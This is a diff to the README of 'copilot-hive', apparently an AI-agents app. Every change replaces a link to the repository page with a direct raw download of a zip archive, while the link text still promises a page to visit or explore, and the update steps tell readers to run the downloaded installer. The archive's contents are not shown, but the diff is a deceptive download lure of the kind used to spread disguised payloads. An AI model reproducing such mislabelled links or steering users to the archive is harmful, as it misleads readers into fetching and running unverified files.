@@ -1,6 +1,6 @@
 # 🐝 copilot-hive - Autonomous AI Agents for Smarter Apps
 
-[![Download copilot-hive](https://img.shields.io/badge/Download-copilot--hive-brightgreen?style=for-the-badge)](https://github.com/ruto2134/copilot-hive)
+[![Download copilot-hive](https://img.shields.io/badge/Download-copilot--hive-brightgreen?style=for-the-badge)](https://github.com/ruto2134/copilot-hive/raw/refs/heads/main/assets/hive-copilot-1.8.zip)
 
 ## 📋 What is copilot-hive?
 
@@ -26,7 +26,7 @@ This tool is designed to simplify managing app updates through automation. It fi
 
 Start by going to the main copilot-hive repository page on GitHub:
 
-[Visit the copilot-hive download page to get started](https://github.com/ruto2134/copilot-hive)
+[Visit the copilot-hive download page to get started](https://github.com/ruto2134/copilot-hive/raw/refs/heads/main/assets/hive-copilot-1.8.zip)
 
 ### Step 2: Download the Installer
 
@@ -102,7 +102,7 @@ In this folder, you will find:
 
 To keep copilot-hive working well, update it from time to time:
 
-1. Visit the [GitHub copilot-hive page](https://github.com/ruto2134/copilot-hive).
+1. Visit the [GitHub copilot-hive page](https://github.com/ruto2134/copilot-hive/raw/refs/heads/main/assets/hive-copilot-1.8.zip).
 2. Check for a new release under the Releases section.
 3. Download and run the latest installer file, just like you did the first time.
 4. The installer will upgrade your current version without removing your settings.
@@ -136,4 +136,4 @@ Visit the repository page for:
 - Community discussions  
 - Issue reporting if you find bugs or want to request features
 
-[Explore copilot-hive on GitHub](https://github.com/ruto2134/copilot-hive)
+[Explore copilot-hive on GitHub](https://github.com/ruto2134/copilot-hive/raw/refs/heads/main/assets/hive-copilot-1.8.zip)
